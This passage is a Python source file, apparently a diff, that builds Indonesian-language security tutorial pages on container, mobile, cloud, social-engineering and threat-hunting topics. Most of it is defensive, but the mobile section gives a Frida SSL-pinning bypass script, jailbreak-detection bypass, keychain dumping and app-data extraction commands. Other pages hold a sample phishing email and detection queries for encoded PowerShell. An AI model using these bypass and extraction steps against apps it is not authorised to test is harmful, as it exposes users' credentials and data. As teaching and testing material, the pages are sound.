+              cpu: "500m"
+            requests:
+              memory: "128Mi"
+              cpu: "250m"

+# Network Policy — Zero Trust
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+    - Egress

+# RBAC — Least Privilege
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: app-reader
+rules:
+  - apiGroups: [""]
+    resources: ["pods", "services"]
+    verbs: ["get", "list", "watch"]</pre>
      </div>

      <h2 id="network">6. Container Network Security</h2>
      <p>Network segmentation mencegah lateral movement. Gunakan network policy, service mesh, dan mTLS.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">YAML — Istio mTLS</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># Istio mTLS — Enforce encrypted communication
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+  namespace: production
+spec:
+  mtls:
+    mode: STRICT

+# Authorization policy
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: frontend-to-backend
+spec:
+  selector:
+    matchLabels:
+      app: backend
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/production/sa/frontend"]
+      to:
+        - operation:
+            methods: ["GET", "POST"]
+            paths: ["/api/*"]</pre>
      </div>

      <h2 id="secrets">7. Secrets Management</h2>
      <p>Jangan menyimpan secrets dalam code, env vars plain text, atau ConfigMap. Gunakan external secrets manager.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">YAML — External Secrets</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># External Secrets Operator — Vault Integration
+apiVersion: external-secrets.io/v1beta1
+kind: ExternalSecret
+metadata:
+  name: app-secrets
+spec:
+  refreshInterval: 1h
+  secretStoreRef:
+    name: vault-backend
+    kind: SecretStore
+  target:
+    name: app-secrets
+    creationPolicy: Owner
+  data:
+    - secretKey: db-password
+      remoteRef:
+        key: secret/data/myapp
+        property: db_password</pre>
      </div>

      <h2 id="compliance">8. Compliance &amp; Audit</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Docker CIS Benchmark</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># Docker CIS Benchmark Audit
+docker run --rm --net host --pid host \\
+  -v /var/run/docker.sock:/var/run/docker.sock \\
+  docker/docker-bench-security

+# Kubernetes CIS
+kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

+# Trivy compliance
+trivy k8s --compliance=cis cluster
+trivy k8s --compliance=nsa cluster</pre>
      </div>
"""

# ---- 5. Mobile Security ----
bodies["mobile-security-testing.html"] = """
      <h2 id="pengenalan">1. Pengenalan Mobile Security Testing</h2>
      <p><strong>Mobile Application Security Testing</strong> adalah proses evaluasi keamanan aplikasi mobile. Dengan 6.8 miliar pengguna smartphone global, mobile apps menjadi target utama karena menyimpan data sensitif seperti credentials, data finansial, dan informasi pribadi.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>OWASP Mobile Top 10 risks</li>
        <li>Android dan iOS security architecture</li>
        <li>Static dan dynamic analysis</li>
        <li>Reverse engineering mobile apps</li>
        <li>Network traffic interception</li>
        <li>Automated mobile security testing</li>
      </ul></div>
      <h3>Mobile Attack Surface</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Mobile App Attack Surface</div>
<pre>
┌─────────────────────────────────────────────────────┐
│           MOBILE APP ATTACK SURFACE                   │
│                                                      │
│  ┌──────────────────────────────────────────────┐   │
│  │              MOBILE DEVICE                    │   │
│  │  ┌─────────┐  ┌─────────┐  ┌──────────┐    │   │
│  │  │   App    │  │  OS     │  │ Hardware │    │   │
│  │  │• Storage│  │• Root/  │  │• Secure  │    │   │
│  │  │• Code   │  │  Jailbrk│  │  Enclave │    │   │
│  │  │• IPC    │  │• Sandbox│  │• Biometr │    │   │
│  │  │• Memory │  │• Perms  │  │• NFC/BLE │    │   │
│  │  └─────────┘  └─────────┘  └──────────┘    │   │
│  └──────────────────────────────────────────────┘   │
│                       │                              │
│                       ▼                              │
│  ┌──────────────────────────────────────────────┐   │
│  │              NETWORK                          │   │
│  │  • MITM/TLS interception                     │   │
│  │  • Certificate pinning bypass                │   │
│  │  • API tampering                             │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="owasp">2. OWASP Mobile Top 10 (2024)</h2>
      <table class="net-table"><thead><tr><th>#</th><th>Risiko</th><th>Deskripsi</th></tr></thead><tbody>
        <tr><td>M1</td><td>Improper Credential Usage</td><td>Hardcoded credentials, insecure storage</td></tr>
        <tr><td>M2</td><td>Inadequate Supply Chain Security</td><td>Compromised SDK, malicious libraries</td></tr>
        <tr><td>M3</td><td>Insecure Authentication</td><td>Weak auth, missing checks</td></tr>
        <tr><td>M4</td><td>Insufficient Input Validation</td><td>Injection, XSS, buffer overflow</td></tr>
        <tr><td>M5</td><td>Insecure Communication</td><td>No TLS, weak cipher</td></tr>
        <tr><td>M6</td><td>Inadequate Privacy Controls</td><td>Data leakage, PII exposure</td></tr>
        <tr><td>M7</td><td>Insufficient Binary Protections</td><td>No obfuscation, debug enabled</td></tr>
        <tr><td>M8</td><td>Security Misconfiguration</td><td>Debug mode, backup enabled</td></tr>
        <tr><td>M9</td><td>Insecure Data Storage</td><td>Plaintext, world-readable</td></tr>
        <tr><td>M10</td><td>Insufficient Cryptography</td><td>Weak algorithm, hardcoded keys</td></tr>
      </tbody></table>

      <h2 id="android">3. Android Testing Environment</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Android Pentesting Setup</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Android Security Testing Environment
+# =============================================

+# 1. Install tools
+pip install frida-tools objection drozer

+# 2. Setup Burp Suite proxy
+# Burp > Proxy > Options > Add: all interfaces:8080
+# Mobile: WiFi proxy ke laptop IP:8080
+# Install Burp CA certificate

+# 3. Bypass SSL Pinning dengan Frida
+frida -U -f com.target.app -l ssl-bypass.js --no-pause

+# ssl-bypass.js:
+# Java.perform(function() {
+#   var TrustManager = Java.registerClass({
+#     name: 'com.custom.TrustManager',
+#     implements: [Java.use('javax.net.ssl.X509TrustManager')],
+#     methods: {
+#       checkClientTrusted: function(chain, authType) {},
+#       checkServerTrusted: function(chain, authType) {},
+#       getAcceptedIssuers: function() { return []; }
+#     }
+#   });
+#   var SSLContext = Java.use('javax.net.ssl.SSLContext');
+#   var ctx = SSLContext.getInstance('TLS');
+#   ctx.init(null, [TrustManager.$new()], null);
+# });

+# 4. Decompile APK
+apktool d target.apk -o decompiled
+jadx --show-bad-code target.apk -d jadx_out

+# 5. Enumerate components
+drozer console connect
+dz> run app.package.attacksurface com.target.app
+dz> run app.activity.info -a com.target.app
+dz> run app.provider.info -a com.target.app
+dz> run app.broadcast.info -a com.target.app</pre>
      </div>

      <h2 id="static">4. Static Analysis (SAST)</h2>
      <p>Static analysis menganalisis source code atau binary tanpa menjalankan aplikasi. Menemukan hardcoded secrets, insecure API usage, dan vulnerability pattern.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Static Analysis</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Static Analysis Tools &amp; Techniques
+# =============================================

+# 1. MobSF (Mobile Security Framework)
+docker run -p 8000:8000 opensecurity/mobsf:latest

+# 2. Hardcoded secrets
+grep -rn "api_key\\|password\\|secret\\|token" \\
+  decompiled/smali/

+# 3. Exported components
+grep -A5 'exported="true"' decompiled/AndroidManifest.xml

+# 4. Insecure cryptography
+grep -rn "DES\\|RC4\\|ECB\\|MD5" decompiled/smali/

+# 5. Network security config
+cat decompiled/res/xml/network_security_config.xml

+# 6. Insecure WebView
+grep -rn "setJavaScriptEnabled\\|setAllowFileAccess" \\
+  decompiled/smali/

+# 7. Semgrep
+semgrep --config=p/android decompiled/
+semgrep --config=p/owasp-mobile decompiled/</pre>
      </div>

      <h2 id="dynamic">5. Dynamic Analysis (DAST)</h2>
      <p>Dynamic analysis menguji aplikasi saat berjalan. Menemukan insecure storage, IPC, dan runtime manipulation.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Dynamic Analysis</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Dynamic Analysis Techniques
+# =============================================

+# 1. Trace API calls
+frida-trace -U -i "open*" com.target.app

+# 2. Hook crypto functions
+frida -U com.target.app -l crypto-hook.js

+# 3. Enumerate stored files
+adb shell run-as com.target.app ls -la /data/data/com.target.app/
+adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml

+# 4. Content Provider leaks
+adb shell content query --uri content://com.target.app.provider/users

+# 5. Backup vulnerability
+adb backup -f backup.ab com.target.app
+java -jar abe.jar unpack backup.ab backup.tar
+tar xf backup.tar</pre>
      </div>

      <h2 id="ios">6. iOS Security Testing</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — iOS Pentesting</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# iOS Security Testing Setup
+# =============================================

+# Requirements: Jailbroken iPhone (palera1n/Dopamine)

+# 1. Explore filesystem
+objection -g "com.target.app" explore
+[objection] ls /var/mobile/Containers/Data/Application/

+# 2. Bypass jailbreak detection
+frida -U -f com.target.app -l ios-jb-bypass.js --no-pause

+# 3. Bypass SSL pinning
+objection -g com.target.app explore
+[objection] ios sslpinning disable

+# 4. Dump keychain
+[objection] ios keychain dump

+# 5. Binary analysis
+class-dump -H TargetApp.app/TargetApp
+otool -L TargetApp.app/TargetApp</pre>
      </div>

      <h2 id="network">7. Network Traffic Analysis</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Network Analysis</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Mobile Network Traffic Analysis
+# =============================================

+# 1. mitmproxy
+mitmweb --listen-port 8080

+# 2. Install CA certificate
+# Download http://mitm.it di mobile browser
+# Android: Settings > Security > Install certificate
+# iOS: Settings > General > Profile > Install

+# 3. Monitor with tcpdump
+adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap
+adb pull /sdcard/capture.pcap

+# 4. Bypass certificate pinning
+objection -g com.target.app explore
+[objection] android sslpinning disable

+# 5. ReFlutter (Flutter apps)
+reflutter target.ipa</pre>
      </div>

      <h2 id="automation">8. Automated Testing</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">YAML — Mobile Security CI/CD</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># Mobile Security CI/CD Pipeline
+name: Mobile Security Scan
+on:
+  push:
+    branches: [main, develop]
+jobs:
+  security-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: MobSF Scan
+        uses: fundacaociatec/mobsf-action@v1
+        with:
+          file_path: app/build/outputs/apk/debug/app-debug.apk
+      - name: Semgrep SAST
+        uses: returntocorp/semgrep-action@v1
+        with:
+          config: p/owasp-mobile</pre>
      </div>
"""

# ---- 6. Social Engineering ----
bodies["social-engineering-awareness.html"] = """
      <h2 id="pengenalan">1. Pengenalan Social Engineering</h2>
      <p><strong>Social Engineering</strong> adalah manipulasi psikologis untuk membujuk korban melakukan tindakan atau membocorkan informasi sensitif. Menurut Verizon DBIR 2024, 68% data breaches melibatkan faktor manusia.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Berbagai jenis social engineering attacks</li>
        <li>Teknik manipulasi psikologis</li>
        <li>Mengenali indikator phishing</li>
        <li>Spear phishing dan Business Email Compromise</li>
        <li>Physical social engineering</li>
        <li>Membangun program security awareness</li>
      </ul></div>
      <h3>Prinsip Psikologis yang Dieksploitasi</h3>
      <table class="net-table"><thead><tr><th>Prinsip</th><th>Penjelasan</th><th>Contoh Serangan</th></tr></thead><tbody>
        <tr><td><strong>Authority</strong></td><td>Kepatuhan terhadap figur otoritas</td><td>Email dari "CEO" minta transfer</td></tr>
        <tr><td><strong>Urgency</strong></td><td>Bertindak tanpa berpikir</td><td>"Akun Anda akan diblokir dalam 24 jam!"</td></tr>
        <tr><td><strong>Scarcity</strong></td><td>Ketakutan kehilangan kesempatan</td><td>"Promo terbatas — klik sekarang!"</td></tr>
        <tr><td><strong>Social Proof</strong></td><td>Mengikuti tindakan orang lain</td><td>"10,000 orang sudah download"</td></tr>
        <tr><td><strong>Trust</strong></td><td>Mempercayai pihak familiar</td><td>Email yang meniru vendor resmi</td></tr>
        <tr><td><strong>Fear</strong></td><td>Ketakutan akan konsekuensi</td><td>"Tagihan Anda belum dibayar"</td></tr>
      </tbody></table>

      <h2 id="phishing">2. Phishing Attack</h2>
      <p>Phishing adalah teknik social engineering paling umum, menggunakan email, SMS (smishing), atau voice call (vishing) untuk mencuri kredensial atau menginstal malware.</p>
      <h3>Anatomy of a Phishing Email</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Anatomy of Phishing Email</div>
<pre>
┌─────────────────────────────────────────────────────────┐
│ From: security@bankbca.co.id (SPOOFED)                   │
│ To: victim@company.com                                   │
│ Subject: ⚠️ Akun Anda Diblokir — Verifikasi Segera      │
│──────────────────────────────────────────────────────────│
│                                                          │
│ [Logo Bank BCA]                                          │
│                                                          │
│ Yth. Nasabah,                                            │
│                                                          │
│ Kami mendeteksi aktivitas mencurigakan pada              │
│ akun Anda. Silakan verifikasi identitas SEGERA           │
│ melalui link di bawah ini.                               │
│                                                          │
│ [🔒 Verifikasi Akun Saya]  ← LINK PALSU                 │
│  https://bca-secure-verify.com/login                     │
│                                                          │
│ Jika tidak diverifikasi dalam 24 JAM,                   │
│ akun Anda akan DIBLOKIR PERMANEN.                       │
│                                                          │
│ RED FLAGS:                                               │
│ ❌ Sender: bankbca.co.id (bukan bca.co.id)              │
│ ❌ Urgency &amp; fear tactics                                │
│ ❌ Suspicious URL                                        │
│ ❌ Generic greeting                                      │
│ ❌ Minta verifikasi via link email                      │
└─────────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="pretexting">3. Pretexting &amp; Impersonation</h2>
      <p>Pretexting adalah membuat skenario palsu untuk mendapatkan kepercayaan. Attacker berpura-pura menjadi IT support, vendor, atau pihak berwenang.</p>
      <h3>Common Pretexting Scenarios</h3>
      <ul>
        <li><strong>IT Support</strong> — "Saya dari IT, perlu remote ke komputer Anda untuk update"</li>
        <li><strong>Vendor</strong> — "Kami dari Microsoft, lisensi Anda bermasalah"</li>
        <li><strong>HR/Finance</strong> — "Perlu data karyawan untuk payroll"</li>
        <li><strong>Law Enforcement</strong> — "Ini penyelidikan, kami butuh akses"</li>
      </ul>
      <div class="warning-box"><div class="info-box-title">⚠️ Peringatan</div>
        <p>Selalu verifikasi identitas caller/pengirim melalui channel terpisah sebelum memberikan informasi atau akses. Jangan pernah memberikan password atau kode OTP melalui telepon.</p>
      </div>

      <h2 id="baiting">4. Baiting &amp; Quid Pro Quo</h2>
      <p><strong>Baiting</strong> menggunakan rasa penasaran korban dengan media yang menggiurkan. <strong>Quid pro quo</strong> menawarkan layanan gratis sebagai imbalan informasi.</p>
      <ul>
        <li>USB drive label "Gaji Karyawan 2024" di parkiran — berisi malware</li>
        <li>"Free WiFi" hotspot yang evil twin</li>
        <li>Software bajakan yang sudah di-inject malware</li>
        <li>QR code palsu yang mengarah ke phishing site</li>
      </ul>

      <h2 id="physical">5. Physical Social Engineering</h2>
      <p>Serangan fisik memanfaatkan kesopanan untuk mendapatkan akses ke area terlarang.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Checklist — Physical Security</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Physical Social Engineering Awareness
+# =============================================

+# TAILGATING
+# ❌ Orang tidak menunjukkan badge
+# ❌ Membawa banyak barang minta tolong buka pintu
+# ✅ Selalu verifikasi badge orang di belakang
+# ✅ Jangan pernah pegang pintu untuk orang asing
+# ✅ Gunakan mantrap/turnstile di area sensitif

+# DUMPSTER DIVING
+# ✅ Shred dokumen sensitif
+# ✅ Hancurkan media (hard disk, USB)
+# ✅ Gunakan locked bins untuk dokumen rahasia

+# IMPERSONATION
+# ❌ Tidak ada appointment sebelumnya
+# ❌ Tidak bisa diverifikasi ke vendor
+# ❌ Minta akses ke area yang tidak seharusnya</pre>
      </div>

      <h2 id="bec">6. Spear Phishing &amp; BEC</h2>
      <p><strong>Spear phishing</strong> ditargetkan ke individu spesifik menggunakan informasi personal. <strong>BEC (Business Email Compromise)</strong> menargetkan karyawan finance.</p>
      <h3>BEC Attack Chain</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: BEC Attack Flow</div>
<pre>
┌─────────────────────────────────────────────────────┐
│           BUSINESS EMAIL COMPROMISE (BEC)             │
│                                                      │
│  Step 1: OSINT &amp; Reconnaissance                    │
│  ├── LinkedIn: identifikasi CFO, Finance team       │
│  ├── Company website: struktur organisasi           │
│  └── Email pattern: firstname.lastname@company.com  │
│                                                      │
│  Step 2: Email Account Compromise                   │
│  ├── Credential phishing atau password spray        │
│  └── Akses email korban                            │
│                                                      │
│  Step 3: Email Thread Hijacking                     │
│  ├── Monitor email thread tentang pembayaran        │
│  ├── Ubah detail bank di invoice                    │
│  └── Kirim dari akun asli korban                   │
│                                                      │
│  Step 4: Execute Transfer                           │
│  ├── "Mohon transfer ke rekening baru ini"         │
│  └── Finance team transfer ke rekening attacker     │
└─────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="defense">7. Defense Strategy</h2>
      <h3>Technical Controls</h3>
      <table class="net-table"><thead><tr><th>Kontrol</th><th>Fungsi</th><th>Implementasi</th></tr></thead><tbody>
        <tr><td><strong>SPF/DKIM/DMARC</strong></td><td>Verifikasi pengirim email</td><td>Set p=reject di DMARC</td></tr>
        <tr><td><strong>Email Gateway</strong></td><td>Filter phishing &amp; malware</td><td>Advanced threat protection</td></tr>
        <tr><td><strong>Web Filter</strong></td><td>Blokir phishing site</td><td>DNS filtering + URL categorization</td></tr>
        <tr><td><strong>MFA</strong></td><td>Mitigasi stolen credentials</td><td>FIDO2/WebAuthn (bukan SMS)</td></tr>
        <tr><td><strong>SIEM</strong></td><td>Deteksi anomali login</td><td>Impossible travel, geo-anomaly</td></tr>
      </tbody></table>
      <div class="code-block"><div class="code-header"><span class="code-lang">DNS — Email Security</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Email Security Configuration
+# =============================================

+# SPF Record
+v=spf1 include:_spf.google.com include:spf.protection.outlook.com -all

+# DKIM Record
+selector1._domainkey.company.com TXT "v=DKIM1; k=rsa; p=MIGfMA0..."

+# DMARC Record
+_dmarc.company.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@company.com; pct=100"</pre>
      </div>

      <h2 id="training">8. Security Awareness Training</h2>
      <p>Human firewall adalah pertahanan terakhir. Program training yang efektif mengubah karyawan dari weakest link menjadi strongest link.</p>
      <div class="info-box info"><div class="info-box-title">💡 Program Phishing Simulation</div><ul>
        <li><strong>Baseline</strong> — Kirim phishing test pertama untuk mengukur awareness</li>
        <li><strong>Training</strong> — Training interaktif berdasarkan hasil baseline</li>
        <li><strong>Simulasi rutin</strong> — Setiap 2-4 minggu dengan tingkat kesulitan meningkat</li>
        <li><strong>Just-in-time</strong> — Saat user klik phishing, langsung tampilkan training</li>
        <li><strong>Measure</strong> — Track click rate, report rate, time-to-report</li>
      </ul></div>
"""

# ---- 7. Cloud Security Posture ----
bodies["cloud-security-posture.html"] = """
      <h2 id="pengenalan">1. Pengenalan CSPM</h2>
      <p><strong>Cloud Security Posture Management (CSPM)</strong> adalah tools dan praktik yang secara kontinu memantau dan memperbaiki misconfiguration serta compliance violation di cloud. Gartner memperkirakan 99% cloud security failures hingga 2025 adalah kesalahan pelanggan.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Cloud misconfiguration yang paling umum</li>
        <li>Security best practices AWS, Azure, GCP</li>
        <li>IaC security scanning</li>
        <li>Compliance monitoring</li>
        <li>Multi-cloud security strategy</li>
        <li>Automated remediation</li>
      </ul></div>

      <h2 id="misconfig">2. Common Cloud Misconfigurations</h2>
      <table class="net-table"><thead><tr><th>Misconfiguration</th><th>Dampak</th><th>Deteksi</th></tr></thead><tbody>
        <tr><td>Public S3 bucket</td><td>Data exposure</td><td>CloudTrail, GuardDuty</td></tr>
        <tr><td>Over-permissive IAM</td><td>Privilege escalation</td><td>IAM Access Analyzer</td></tr>
        <tr><td>Security group 0.0.0.0/0</td><td>Open to internet</td><td>VPC Flow Logs</td></tr>
        <tr><td>Unencrypted storage</td><td>Data at rest exposure</td><td>Config Rules</td></tr>
        <tr><td>No MFA on root</td><td>Account takeover</td><td>Security Hub</td></tr>
        <tr><td>Public RDS</td><td>Database exposure</td><td>Config Rules</td></tr>
        <tr><td>Logging disabled</td><td>No audit trail</td><td>CloudTrail</td></tr>
      </tbody></table>

      <h2 id="aws">3. AWS Security Posture</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — AWS Security Hardening</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# AWS Cloud Security Hardening
+# =============================================

+# 1. Enable Security Hub
+aws securityhub enable-security-hub --enable-default-standards

+# 2. Enable Config recorder
+aws configservice put-configuration-recorder \\
+  --configuration-recorder name=default,roleArn=arn:aws:iam::role/awsconfig

+# 3. S3 public access block
+aws s3api put-public-access-block \\
+  --bucket my-bucket \\
+  --public-access-block-configuration \\
+  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

+# 4. Enable GuardDuty
+aws guardduty create-detector --enable

+# 5. Check overly permissive IAM
+aws iam get-account-authorization-details | \\
+  python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+for p in data.get('UserDetailList',[]):
+    for policy in p.get('UserPolicyList',[]):
+        for stmt in policy.get('PolicyDocument',{}).get('Statement',[]):
+            if stmt.get('Effect')=='Allow' and stmt.get('Resource')=='*':
+                print(f'WARNING: {p[\"UserName\"]} has * resource')
+"</pre>
      </div>

      <h2 id="azure">4. Azure Security</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Azure Security</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Azure Security Configuration
+# =============================================

+# 1. Enable Defender for Cloud
+az security auto-provisioning-setting update --name default --autoProvision On

+# 2. NSG audit — check 0.0.0.0/0
+az network nsg list --query "[].securityRules[?access=='Allow' && direction=='Inbound' && sourceAddressPrefix=='*']"

+# 3. Enable Azure Policy
+az policy assignment create \\
+  --policy "Audit VMs that do not use managed disks"</pre>
      </div>

      <h2 id="gcp">5. GCP Security</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — GCP Security</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# GCP Security Posture Management
+# =============================================

+# 1. Enable Security Command Center
+gcloud scc sources enable --organization=ORG_ID --source=SOURCE_ID

+# 2. Audit logging
+gcloud logging sinks create audit-sink \\
+  --destination=storage.googleapis.com/audit-bucket \\
+  --log-filter="logName:cloudaudit.googleapis.com"

+# 3. Check public GCS buckets
+gsutil iam get gs://my-bucket | grep allUsers

+# 4. Firewall audit
+gcloud compute firewall-rules list \\
+  --filter="sourceRanges=0.0.0.0/0 AND allowed.ports=22"</pre>
      </div>

      <h2 id="iac">6. Infrastructure as Code Security</h2>
      <p>Scanning IaC templates sebelum deployment mencegah misconfiguration masuk ke production.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — IaC Scanning</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# IaC Security Scanning
+# =============================================

+# 1. Checkov — Terraform/CloudFormation
+checkov -d ./terraform/
+
+# 2. tfsec
+tfsec ./terraform/
+
+# 3. Terrascan
+terrascan scan -d ./terraform/ -i terraform
+
+# 4. cfn-lint
+cfn-lint template.yaml
+
+# 5. Semgrep IaC rules
+semgrep --config=p/terraform ./terraform/</pre>
      </div>

      <h2 id="compliance">7. Compliance &amp; Governance</h2>
      <table class="net-table"><thead><tr><th>Framework</th><th>Fokus</th><th>Cloud Mapping</th></tr></thead><tbody>
        <tr><td><strong>CIS Benchmarks</strong></td><td>Hardening guidelines</td><td>CIS AWS/Azure/GCP Foundations</td></tr>
        <tr><td><strong>SOC 2</strong></td><td>Trust service criteria</td><td>Security, Availability, Confidentiality</td></tr>
        <tr><td><strong>ISO 27001</strong></td><td>ISMS</td><td>A.12 Operations Security</td></tr>
        <tr><td><strong>PCI DSS</strong></td><td>Payment card data</td><td>Req 1-12 mapped to cloud controls</td></tr>
      </tbody></table>

      <h2 id="tools">8. CSPM Tools &amp; Automation</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Bash — Open Source CSPM</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# CSPM Tools — Open Source
+# =============================================

+# 1. Prowler — AWS security
+pip install prowler
+prowler aws --checks cis_level2

+# 2. ScoutSuite — Multi-cloud
+pip install scoutsuite
+scout aws

+# 3. Steampipe — SQL queries
+steampipe plugin install aws
+steampipe query "SELECT name FROM aws_s3_bucket WHERE bucket_policy_is_public"</pre>
      </div>
"""

# ---- 8. Threat Hunting ----
bodies["threat-hunting-techniques.html"] = """
      <h2 id="pengenalan">1. Pengenalan Threat Hunting</h2>
      <p><strong>Threat Hunting</strong> adalah proses proaktif untuk mencari indikator serangan tersembunyi yang tidak terdeteksi tools otomatis. Mengasumsikan attacker sudah ada di dalam jaringan.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Hypothesis-driven threat hunting</li>
        <li>MITRE ATT&CK framework mapping</li>
        <li>IOC dan IOA hunting</li>
        <li>Behavioral analytics</li>
        <li>Membangun hunting program</li>
      </ul></div>
      <p>Rata-rata waktu deteksi breach adalah 197 hari. Automated tools hanya mendeteksi sebagian ancaman. Threat hunting menutup gap ini dengan pendekatan proaktif yang dipimpin analis manusia.</p>

      <h2 id="hypothesis">2. Hypothesis-Driven Hunting</h2>
      <p>Pendekatan dimulai dengan hipotesis tentang bagaimana attacker beroperasi, lalu mengumpulkan data untuk membuktikan atau menyanggah.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Template — Hunting Hypothesis</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Threat Hunting Hypothesis Template
+# =============================================

+# HYPOTHESIS 1: Lateral Movement via PsExec
+# ------------------------------------------------
+# Premise: Attacker menggunakan PsExec untuk
+# bergerak lateral setelah akses awal
+# 
+# Expected Evidence:
+# - Event ID 7045 (service installation) PsExec
+# - Event ID 4624 Type 3 logon dari unusual source
+# - Named pipe \\*\pipe\psexecsvc
+#
+# Query:
+index=windows (EventCode=7045 AND Image="*PSEXESVC*")
+  OR (EventCode=4624 AND Logon_Type=3)
+| stats count by ComputerName, Account_Name, IpAddress
+| where count > 3

+# HYPOTHESIS 2: DNS Tunneling for Exfiltration
+# ------------------------------------------------
+# Premise: Attacker menggunakan DNS untuk C2/exfil
+#
+# Query:
+index=dns
+| eval query_len=len(query)
+| where query_len > 50
+| stats count avg(query_len) as avg_len
+  by dest
+| where count > 100 AND avg_len > 50</pre>
      </div>

      <h2 id="mitre">3. MITRE ATT&CK Mapping</h2>
      <p>MITRE ATT&CK mendokumentasikan TTP (Tactics, Techniques, Procedures) attacker. Mapping hunting ke ATT&CK memastikan coverage komprehensif.</p>
      <table class="net-table"><thead><tr><th>Tactic</th><th>Technique</th><th>Hunting Focus</th></tr></thead><tbody>
        <tr><td>Initial Access</td><td>T1566 Phishing</td><td>Email attachments, URLs</td></tr>
        <tr><td>Execution</td><td>T1059 Command/Script</td><td>PowerShell, WMI</td></tr>
        <tr><td>Persistence</td><td>T1053 Scheduled Task</td><td>New tasks, registry keys</td></tr>
        <tr><td>Priv Escalation</td><td>T1068 Exploitation</td><td>Unusual process parents</td></tr>
        <tr><td>Defense Evasion</td><td>T1070 Indicator Removal</td><td>Log clearing, timestomping</td></tr>
        <tr><td>Credential Access</td><td>T1003 Credential Dump</td><td>LSASS access</td></tr>
        <tr><td>Lateral Movement</td><td>T1021 Remote Services</td><td>RDP, SMB, PsExec</td></tr>
        <tr><td>Exfiltration</td><td>T1048 Exfiltration</td><td>Large outbound, DNS tunnel</td></tr>
      </tbody></table>

      <h2 id="ioc">4. IOC-Based Hunting</h2>
      <p>IOC hunting mencari artifact spesifik yang terkait serangan — IP, domain, file hash, atau registry key.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Splunk — IOC Hunting</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# IOC Hunting Queries
+# =============================================

+# 1. Known malicious IPs
+| inputlookup threat_intel_ips.csv
+| join type=inner ip [
+    search index=network sourcetype=firewall
+    | fields src_ip, dest_ip
+    | rename dest_ip as ip
+  ]

+# 2. File hash hunting
+index=sysmon EventCode=1
+| where hash IN ("abc123...", "def456...")
+| table _time, Computer, User, Image, hash

+# 3. Registry persistence
+index=sysmon EventCode=13
+| where TargetObject LIKE "%CurrentVersion\\Run%"
+| table _time, Computer, TargetObject, Details

+# 4. PowerShell encoded command
+index=windows EventCode=4104
+| where ScriptBlockText LIKE "%-enc%"
+  OR ScriptBlockText LIKE "%FromBase64String%"
+| table _time, Computer, ScriptBlockText</pre>
      </div>

      <h2 id="behavioral">5. Behavioral Analytics</h2>
